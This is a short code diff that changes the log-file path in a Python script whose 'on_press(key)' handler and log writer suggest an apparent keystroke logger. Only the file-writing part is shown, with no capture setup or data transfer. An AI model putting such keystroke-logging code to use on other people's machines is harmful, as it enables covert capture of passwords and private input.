@@ -10,8 +10,8 @@ def on_press(key):
 
 
 def write_1(var):
-    open("D:\logs.txt", "w")
-    with open("D:\logs.txt", "a") as f:
+    open("logs.txt", "w")
+    with open("logs.txt", "a") as f:
         # for i in var:
         new_var = str(var).replace("'", '')
         f.write(new_var)
